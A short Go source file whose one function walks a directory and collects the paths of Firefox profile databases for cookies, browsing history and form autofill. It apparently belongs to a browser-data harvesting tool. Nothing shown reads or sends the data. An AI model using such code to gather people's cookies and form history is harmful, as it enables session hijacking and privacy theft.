package main

import (
	"io/fs"
	"path/filepath"
)

func GeckoBrowser(paths string) (paths_cookie, paths_autofill, paths_history []string) {
	filepath.Walk(paths, func(path1 string, info fs.FileInfo, err error) error {
		if err == nil {
			if info.Name() == "cookies.sqlite" {
				paths_cookie = append(paths_cookie, path1)
			} else if info.Name() == "places.sqlite" {
				paths_history = append(paths_history, path1)
			} else if info.Name() == "formhistory.sqlite" {
				paths_autofill = append(paths_autofill, path1)
			}
		}
		return nil
	})
	return
}
